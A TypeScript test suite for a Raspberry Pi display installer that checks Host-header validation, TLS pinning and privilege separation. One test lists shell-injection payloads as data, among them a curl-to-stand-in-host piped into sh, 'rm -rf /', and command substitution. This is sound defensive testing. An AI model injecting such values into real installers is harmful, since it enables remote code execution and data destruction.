// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 OpenMasjid-Solutions
/**
 * The install one-liner, and the one thing about it that has to be right.
 *
 * `/pi.sh` writes an address into a shell script, and that address comes out of the request's
 * `Host` header — which is set by whoever is calling. That makes this the only place in the app
 * where untrusted input is interpolated into something a machine will later *execute*, so the
 * tests here are about the boundary rather than the feature: what gets refused, and what the
 * refused thing would otherwise have done.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import type { IncomingMessage } from 'node:http';
import { originFor, renderInstaller, installerTemplate } from './piInstaller';

const req = (headers: Record<string, string>, encrypted = false): IncomingMessage =>
  ({ headers, socket: { encrypted } }) as unknown as IncomingMessage;

// ── working out this server's address ────────────────────────────────────────

test('the address a Pi is told to use is the one it was curled from', () => {
  assert.equal(originFor(req({ host: '192.168.1.18:7860' }), '/pi.sh'), 'http://192.168.1.18:7860');
});

test('a direct TLS connection is reported as https', () => {
  assert.equal(originFor(req({ host: 'display.local' }, true), '/pi.sh'), 'https://display.local');
});

test('the platform ingress\'s forwarded headers win, since it is what a Pi can reach', () => {
  assert.equal(
    originFor(req({ host: 'internal:7860', 'x-forwarded-host': 'masjid.example', 'x-forwarded-proto': 'https' }), '/display/pi.sh'),
    'https://masjid.example/display',
  );
});

test('the tunnel prefix is kept, or the Pi would post to the platform root', () => {
  assert.equal(originFor(req({ host: 'h' }), '/display/pi.sh'), 'http://h/display');
  assert.equal(originFor(req({ host: 'h' }), '/pi.sh'), 'http://h');
});

test('a forwarded proto that is not https is treated as http, never passed through', () => {
  assert.equal(originFor(req({ host: 'h', 'x-forwarded-proto': 'gopher' }), '/pi.sh'), 'http://h');
});

test('a comma-joined forwarded chain uses the first hop', () => {
  assert.equal(
    originFor(req({ host: 'h', 'x-forwarded-host': 'first.example, second.example' }), '/pi.sh'),
    'http://first.example',
  );
});

test('an IPv6 literal is accepted in brackets', () => {
  assert.equal(originFor(req({ host: '[2001:db8::1]:7860' }), '/pi.sh'), 'http://[2001:db8::1]:7860');
});

// ── the part that would be a remote code execution if it were wrong ──────────

test('a Host header carrying shell syntax is refused, not sanitised', () => {
  // Each of these, substituted into `SERVER='…'` unchecked, ends the quoting and runs a command
  // on every Pi somebody sets up. A refusal is the only acceptable answer.
  const attacks = [
    "h';curl evil.sh|sh;'",
    'h$(id)',
    'h`id`',
    'h;reboot',
    'h\nSERVER=http://evil',
    'h"x',
    "h'x",
    'h x',
    'h|tee /etc/passwd',
    'h&&rm -rf /',
    'h\\',
    'h#comment',
    'h{a,b}',
    'h>out',
  ];
  for (const host of attacks) {
    assert.equal(originFor(req({ host }), '/pi.sh'), null, `accepted: ${JSON.stringify(host)}`);
  }
});

test('an attack routed through the forwarded header is refused too', () => {
  assert.equal(originFor(req({ host: 'ok', 'x-forwarded-host': "e';id;'" }), '/pi.sh'), null);
});

test('a missing or absurd Host is refused', () => {
  assert.equal(originFor(req({}), '/pi.sh'), null);
  assert.equal(originFor(req({ host: 'a'.repeat(300) }), '/pi.sh'), null);
  assert.equal(originFor(req({ host: 'h:999999' }), '/pi.sh'), null);
});

test('every accepted address is inert inside the script\'s single quotes', () => {
  // The second half of the guarantee: the charset cannot express an escape, AND the value lands
  // in single quotes. This asserts the property directly rather than trusting the pattern.
  const hosts = ['h', 'display.local', '192.168.1.18:7860', '[2001:db8::1]', 'a-b.c-d.example:65535'];
  for (const host of hosts) {
    const origin = originFor(req({ host }), '/pi.sh');
    assert.ok(origin, host);
    const line = `SERVER='${origin}'`;
    assert.ok(!/["`$\\\n\r;|&<>(){}]/.test(origin as string), `${origin} carries shell syntax`);
    assert.equal(line.split("'").length, 3, 'the value must not contain a quote of its own');
  }
});

// ── substitution ─────────────────────────────────────────────────────────────

test('every placeholder is filled in', () => {
  const out = renderInstaller("SERVER='@@SERVER@@' R='@@RESVG@@' A='@@AGENT_VERSION@@'", 'http://h', '2.6.2', '0.70.0-dev.8');
  assert.equal(out, "SERVER='http://h' R='2.6.2' A='0.70.0-dev.8'");
  assert.ok(!out.includes('@@'), 'a leftover placeholder is a Pi that installs and never connects');
});

test('a placeholder appearing twice is replaced every time', () => {
  assert.equal(renderInstaller('@@SERVER@@ and @@SERVER@@', 'x', '1', '1'), 'x and x');
});

test('a version string that is not a version cannot smuggle anything in', () => {
  const out = renderInstaller("R='@@RESVG@@'", 'http://h', "2.6.2';id;'", '0.1.0');
  assert.equal(out, "R='unknown'");
});

test('the real installer template renders with nothing left unfilled', () => {
  // Guards against renaming a placeholder in the script and not here, which would ship a Pi
  // installer with a literal @@SERVER@@ in it.
  const tpl = installerTemplate();
  assert.ok(tpl, 'the installer template should be findable from a source checkout');
  const out = renderInstaller(tpl as string, 'http://192.168.1.18:7860', '2.6.2', '0.70.0-dev.8');
  assert.ok(!out.includes('@@'), `unfilled placeholder: ${/@@[A-Z_]+@@/.exec(out)?.[0] ?? ''}`);
  assert.ok(out.includes("SERVER='http://192.168.1.18:7860'"));
});

test('the installer is POSIX sh, refuses to half-run, and never resets an adopted screen', () => {
  const tpl = installerTemplate() as string;
  assert.ok(tpl, 'template missing');
  // `set -eu`: a script piped into sh that half-runs leaves a Pi in a state nobody can describe.
  assert.ok(/^set -eu$/m.test(tpl), 'the installer must abort on the first failure');
  // The config is merged, not rewritten. A re-run that dropped the token would send somebody
  // back to the television to read a code that has already been used.
  assert.ok(/deviceSecret !== "string"/.test(tpl), 'the identity must only be minted when absent');
  assert.ok(!/rm -f? *"?\$CONF"?/.test(tpl), 'the installer must never delete the config');
  // Written through a temporary file: a power cut mid-write must not truncate the credentials.
  assert.ok(tpl.includes('fs.renameSync(tmp, file)'), 'the config write must be atomic');
  // Downloaded to .new and checked before being moved into place.
  // The temp name MUST end in .js. `node --check` infers the module format from the extension and
  // refuses anything it does not recognise — `agent.js.new` died with ERR_UNKNOWN_FILE_EXTENSION on
  // a real Pi, which turned the safety check into the thing that broke the install. The previous
  // version of this test asserted the broken name, so it enforced the bug rather than catching it.
  assert.ok(tpl.includes('node --check "$PREFIX/agent.new.js"'), 'a truncated download must not become the agent');
  // The updater checks a variable rather than a literal, so assert what the variable holds.
  assert.ok(tpl.includes('TMP="$PREFIX/agent.new.js"'), 'the updater temp file must end in .js too');
  assert.ok(
    !/agent\.js\.(new|prev)/.test(tpl),
    'no temp name may end in an extension node cannot parse — that is the bug this test exists for',
  );
});

test('the agent does not run as root', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/^User=\$SERVICE_USER$/m.test(tpl), 'the long-running agent must drop privileges');
  assert.ok(/^SupplementaryGroups=video tty$/m.test(tpl), 'and hold only the groups it needs');
  assert.ok(/^Restart=always$/m.test(tpl), 'a masjid screen must come back on its own');
});

test('the installer carries its licence header, like every other file here', () => {
  const p = path.resolve(__dirname, 'assets', 'pi', 'install.sh');
  const onDisk = fs.existsSync(p) ? fs.readFileSync(p, 'utf8') : (installerTemplate() as string);
  assert.ok(onDisk.startsWith('# SPDX-License-Identifier: AGPL-3.0-only'));
});

// ── keeping a masjid's screens current ───────────────────────────────────────

test('the agent cannot rewrite its own code — the updater is a separate root unit', () => {
  const tpl = installerTemplate() as string;
  // The whole point of splitting it out. A long-running, network-facing process that can rewrite
  // its own binary is a much larger thing to trust than one that cannot.
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(!rwp.includes('$PREFIX'), 'the agent must not have write access to /opt');
  assert.ok(rwp.includes('$CONFDIR') && rwp.includes('$STATEDIR'));
  assert.ok(tpl.includes('openmasjid-screen-update.timer'), 'updates run on their own timer');
  assert.ok(tpl.includes('ExecStart=/opt/openmasjid-screen/update.sh'));
});

test('an update that will not start is rolled back', () => {
  const tpl = installerTemplate() as string;
  // Without this a bad build takes every screen in the masjid dark until somebody notices and
  // knows what to do — and nobody is watching these.
  assert.ok(tpl.includes('agent.prev.js'), 'the previous agent must be kept');
  assert.ok(/is-active --quiet openmasjid-screen\.service/.test(tpl), 'and its replacement checked');
  assert.ok(/rolling back/.test(tpl));
});

test('a truncated download never becomes the running agent', () => {
  const tpl = installerTemplate() as string;
  // Both the installer and the updater check, because either can be interrupted.
  assert.equal((tpl.match(/node --check/g) ?? []).length, 2);
});

test('a masjid with a screen in every hall does not stampede the server', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/RandomizedDelaySec=/.test(tpl), 'every Pi asking at the same second is a thundering herd');
  assert.ok(/OnUnitActiveSec=/.test(tpl));
});

// ── trusting a masjid's own display server ───────────────────────────────────
//
// Found on real hardware: the server was at https://192.168.1.18:8444 behind a self-signed
// certificate with no SAN for that address. curl refused the script; and Node's fetch would have
// refused everything afterwards too, since Node does not read /etc/ssl/certs — so the agent would
// have installed cleanly and then never connected.

test('a self-signed server is pinned, not waved through', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/openssl s_client -connect/.test(tpl), 'it must take a copy of the certificate');
  assert.ok(tpl.includes('--cacert "$CA"'), 'and verify against that copy');
  assert.ok(/NODE_EXTRA_CA_CERTS=\$CA/.test(tpl), 'the agent must be given it too — Node ignores /etc/ssl/certs');
});

test('verification is only abandoned when the name cannot match, and never quietly', () => {
  const tpl = installerTemplate() as string;
  const idx = tpl.indexOf('NODE_TLS_REJECT_UNAUTHORIZED=0');
  assert.ok(idx > 0, 'the fallback exists');
  // Every path that reaches it prints a warning first.
  const before = tpl.slice(Math.max(0, idx - 1500), idx);
  assert.ok(/warn /.test(before), 'falling back to no verification must be said out loud');
});

test('even the fallback pins the public key, so an impostor is still refused', () => {
  // Plain -k accepts ANY certificate, including an attacker's. Pinning the key means they need
  // the private key rather than merely a position on the network. Verified against a real
  // impostor server: accepted the genuine one, rejected the impostor.
  const tpl = installerTemplate() as string;
  assert.ok(tpl.includes('--pinnedpubkey sha256//'), 'the mismatch path must pin the key');
  assert.ok(/openssl x509 -in "\$CA" -pubkey -noout/.test(tpl));
});

test('the updater makes the same trust decision, or self-update stops forever', () => {
  const tpl = installerTemplate() as string;
  // The updater is a separate script with no access to the installer's variables, so the decision
  // is handed to it in a file. It must not try to re-derive it — an earlier version read the flag
  // out of config.json, which the agent overwrites on adoption, so within minutes of every install
  // the updater was guessing, guessing wrong, and failing silently every six hours forever.
  const upd = tpl.slice(tpl.indexOf('cat > "$PREFIX/update.sh"'));
  assert.ok(upd.includes('. "$PREFIX/trust.env"'), 'it must read the decision the installer wrote');
  assert.ok(/curl -fsSL --max-time 120 \$CURL_OPTS/.test(upd), 'and actually pass it to curl');
  // And the installer must have written that file for every branch, including plain HTTP.
  assert.ok(tpl.includes(`printf "CURL_OPTS='%s'`), 'trust.env must carry the curl options');
  assert.ok(tpl.includes(`printf "SERVER='%s'`), 'and the server address');
});

// ── an install that looks hung is an install people reboot half-done ─────────

test('apt is not silenced, and cannot wait forever', () => {
  const tpl = installerTemplate() as string;
  // A freshly booted Pi runs unattended-upgrades, which holds the dpkg lock. With -qq and
  // >/dev/null the installer sat there printing nothing for over fifteen minutes.
  assert.ok(!/apt-get[^\n]*-qq[^\n]*install/.test(tpl), 'apt install must not be quiet');
  assert.ok(!/apt-get[^\n]*install[^\n]*>\s*\/dev\/null/.test(tpl), 'nor have its output discarded');
  assert.ok(tpl.includes('DPkg::Lock::Timeout'), 'apt must not block on the lock indefinitely');
  assert.ok(tpl.includes('wait_for_apt'), 'and should say who is holding it');
});

test('the slow steps announce themselves before they run', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/^STEPS=(\d+)$/m.test(tpl));
  const declared = Number(/^STEPS=(\d+)$/m.exec(tpl)?.[1]);
  const calls = (tpl.match(/^step /gm) ?? []).length;
  assert.equal(calls, declared, 'the step counter must match the number of steps');
  assert.ok(!/npm install[^\n]*>\s*\/dev\/null/.test(tpl), 'the npm install must not be silent either');
});

test('ffmpeg failing does not cost you the timetable', () => {
  const tpl = installerTemplate() as string;
  // It is the largest download by far and the only part not needed to show prayer times.
  const i = tpl.indexOf('Installing ffmpeg');
  assert.ok(i > 0, 'ffmpeg should be its own step');
  const block = tpl.slice(i, i + 900);
  assert.ok(/if apt-get .*ffmpeg; then/.test(block), 'its failure must be handled, not fatal');
  assert.ok(/warn /.test(block));
});

// ── found by an adversarial review of the trust model ────────────────────────

test('the trust decision does not live in the file the agent overwrites', () => {
  // The bug this prevents: the agent rewrites config.json on adoption, keeping only the keys it
  // knows about — so an install-time setting stored there was destroyed minutes after setup. The
  // updater then fell back to a handshake already known to fail on that device and stopped
  // updating forever, silently, while its timer kept looking healthy.
  const tpl = installerTemplate() as string;
  const upd = tpl.slice(tpl.indexOf('cat > "$PREFIX/update.sh"'));
  assert.ok(!upd.includes('insecureTls'), 'the updater must not read trust state out of config.json');
  assert.ok(upd.includes('. "$PREFIX/trust.env"'), 'it must source the installer-written file instead');
  assert.ok(tpl.includes('TRUSTENV="$PREFIX/trust.env"'));
  // And that file must live where the agent cannot write it.
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(!rwp.includes('$PREFIX'), 'trust.env would be agent-writable if /opt were writable');
});

test('the pin is validated with the client that has to live with it', () => {
  // curl and Node are different TLS stacks. Checking only curl can print "pinned — verified" and
  // then hand over a screen whose agent cannot make a single request, with nothing to catch it.
  const tpl = installerTemplate() as string;
  const i = tpl.indexOf('--cacert "$CA"');
  assert.ok(i > 0);
  const block = tpl.slice(i, i + 700);
  assert.ok(/NODE_EXTRA_CA_CERTS="\$CA" node -e/.test(block), 'Node must be asked too, not just curl');
  assert.ok(block.includes('fetch('), 'and asked the same way the agent asks');
});

test('an unreachable server is a refusal, not a silent downgrade', () => {
  // Otherwise a temporary network problem permanently weakens the device, at the one moment
  // nobody would notice: the install carries on and the downgrade is never mentioned again.
  const tpl = installerTemplate() as string;
  const i = tpl.indexOf("could not reach");
  assert.ok(i > 0, 'the unreachable case must be handled explicitly');
  const block = tpl.slice(Math.max(0, i - 300), i + 300);
  assert.ok(/die "could not reach/.test(block), 'it must abort rather than continue');
  assert.ok(!/CURL_OPTS='-k'/.test(block), 'and must not fall through to no verification');
});

test('the hardening does not break the things the agent actually needs', () => {
  const tpl = installerTemplate() as string;
  // Dropping AF_NETLINK looks like tightening and is not: enumerating this machine's own network
  // interfaces goes through netlink, so the agent crashed on startup every five seconds, and
  // glibc's DNS resolution uses it too — ffmpeg would not have resolved a camera by name.
  const fams = /^RestrictAddressFamilies=(.*)$/m.exec(tpl)?.[1] ?? '';
  for (const f of ['AF_INET', 'AF_INET6', 'AF_UNIX', 'AF_NETLINK']) {
    assert.ok(fams.includes(f), `${f} is required — see the comment above this directive`);
  }
});

test('the console is taken off the screen only once something can replace it', () => {
  const tpl = installerTemplate() as string;
  // Unbinding early left the television frozen on whatever boot message was printing at that
  // instant, which reads exactly like a machine stuck in a loop.
  const i = tpl.indexOf('openmasjid-screen-console.service <<');
  assert.ok(i > 0);
  const unit = tpl.slice(i, i + 1400);
  assert.ok(/^After=openmasjid-screen\.service$/m.test(unit), 'the console unit must run AFTER the agent');
  assert.ok(!/^Before=openmasjid-screen\.service$/m.test(unit), 'never before — that is the frozen-screen bug');
});

test('nothing in the expanded heredocs can be executed by accident', () => {
  // The unit files are written with an UNQUOTED heredoc so the installer can substitute settings
  // into them. That makes backticks and $( ) inside command substitution rather than punctuation,
  // and `sh -n` cannot catch it because heredocs expand at run time, not parse time.
  //
  // A code reference written in backticks inside a COMMENT there was executed by dash, which read
  // it as a function definition with an invalid name and killed the installer at its final step
  // on a real Pi. Only the intended variables may expand.
  const tpl = installerTemplate() as string;
  const lines = tpl.split('\n');
  const allowed = new Set(['$NODE_TLS_ENV', '$SERVICE_USER', '$PREFIX', '$CONFDIR', '$STATEDIR']);
  let inside = false;
  const offenders: string[] = [];
  for (const [i, line] of lines.entries()) {
    if (/<<UNIT$/.test(line)) inside = true;
    else if (/^UNIT$/.test(line)) inside = false;
    else if (inside) {
      if (line.includes('`')) offenders.push(`${i + 1}: backtick -> ${line.trim()}`);
      if (line.includes('$(')) offenders.push(`${i + 1}: $( ) -> ${line.trim()}`);
      for (const m of line.match(/\$[A-Za-z_][A-Za-z0-9_]*/g) ?? []) {
        if (!allowed.has(m)) offenders.push(`${i + 1}: unexpected ${m} -> ${line.trim()}`);
      }
    }
  }
  assert.deepEqual(offenders, [], `command substitution or an unknown variable in an expanded heredoc:\n${offenders.join('\n')}`);
});

test('the root dispatcher removes a request BEFORE acting on it', () => {
  // A request still present after the action would retrigger the .path unit and repeat it for ever.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'));
  const del = ctl.indexOf('rm -f "$req"');
  const act = ctl.indexOf('"$PREFIX/update.sh"');
  assert.ok(del > 0 && act > 0, 'both the delete and the action must exist');
  assert.ok(del < act, 'the request must be unlinked first, or the screen loops');
});

test('the dispatcher runs a closed set of verbs with no escape hatch', () => {
  // A compromised agent can drop a file in the spool. It must not be able to invent a verb.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  assert.ok(/tr -dc 'a-z-'/.test(ctl), 'the verb must be reduced to a safe alphabet');
  assert.ok(/case "\$action" in/.test(ctl));
  assert.ok(/^\s*update\)/m.test(ctl), 'update is the only action');
  // The default branch must not execute anything.
  const def = /\*\)([\s\S]*?);;/.exec(ctl)?.[1] ?? '';
  assert.ok(!/\$\(|`|eval|sh |exec /.test(def), `the default branch runs something: ${def.trim()}`);
});

test('the spool is writable by the agent and the dispatcher is not', () => {
  const tpl = installerTemplate() as string;
  // The agent may leave a request...
  assert.ok(tpl.includes('mkdir -p "$STATEDIR/control"'));
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(rwp.includes('$STATEDIR'), 'the spool must be inside what the agent can write');
  // ...but must not be able to change what acts on it.
  assert.ok(!rwp.includes('$PREFIX'), 'control.sh must stay out of the agent\'s reach');
  assert.ok(tpl.includes('chmod 700 "$PREFIX/control.sh"'));
});

test('reboot is rate limited, or a screen can be taken off the wall for good', () => {
  // Nobody is watching a masjid screen. A reboot loop is not an inconvenience, it is a dead screen
  // until somebody drives there — so the limit is on the DEVICE, not in the panel that asked.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  assert.ok(/^\s*reboot\)/m.test(ctl), 'the verb must exist');
  assert.ok(/systemctl reboot/.test(ctl));
  assert.ok(/-lt 600/.test(ctl), 'one reboot per ten minutes at most');
  assert.ok(/last-reboot/.test(ctl), 'and the last one has to be remembered across reboots');
  // The remembered timestamp lives where the agent cannot forge it.
  assert.ok(/\$PREFIX\/last-reboot/.test(ctl), 'in /opt, which the agent cannot write');
  // A corrupt stamp must not read as "never rebooted, go ahead" AND must not crash the dispatcher.
  assert.ok(/\*\[!0-9\]\*/.test(ctl), 'a non-numeric stamp has to be handled');
});

test('the dispatcher still executes nothing outside its closed set', () => {
  // Adding a verb is exactly when this stops being true by accident.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  const verbs = [...ctl.matchAll(/^\s{4}([a-z|]+)\)/gm)].map((m) => m[1]);
  assert.deepEqual(verbs.sort(), ['reboot', 'update'], `unexpected verbs: ${verbs.join(', ')}`);
  const def = /\*\)([\s\S]*?);;/.exec(ctl)?.[1] ?? '';
  assert.ok(!/\$\(|`|eval|exec /.test(def), `the default branch runs something: ${def.trim()}`);
});

test('the hardware video decoder is reachable by the agent', () => {
  // Diagnosed from a real Pi. /dev/video10 existed, bcm2835-codec said "Loaded V4L2 decode", and the
  // service account was in the `video` group — yet ffmpeg reported "Could not find a valid device"
  // on every attempt. The cause was this unit: naming ANY device in DeviceAllow turns it into an
  // ALLOWLIST, so the two entries for the framebuffer and the console were denying the codec nodes
  // regardless of their own permissions.
  const tpl = installerTemplate() as string;
  const allows = [...tpl.matchAll(/^DeviceAllow=(.*)$/gm)].map((m) => m[1]);
  assert.ok(allows.length > 0, 'the unit does use an allowlist');
  assert.ok(
    allows.some((a) => a.startsWith('char-video4linux')),
    `no V4L2 access in the allowlist: ${allows.join(' | ')}`,
  );
  // As a class, not a number: the codec node numbering is not stable across kernels.
  assert.ok(!allows.some((a) => /\/dev\/video\d/.test(a)), 'do not hardcode a video node number');
});

test('the decoder is given enough GPU memory to decode 1080p', () => {
  // The same Pi reported gpu=76M. bcm2835-codec is firmware-side, so it draws on the GPU split
  // rather than system RAM, and 76M is not enough for 1080p — which presents as the decoder simply
  // not being openable rather than as an error anybody can act on.
  const tpl = installerTemplate() as string;
  assert.ok(/gpu_mem=128/.test(tpl), 'the installer must raise the split');
  assert.ok(/grep -q '\^gpu_mem=' /.test(tpl), 'and must not fight an explicit setting already there');
});
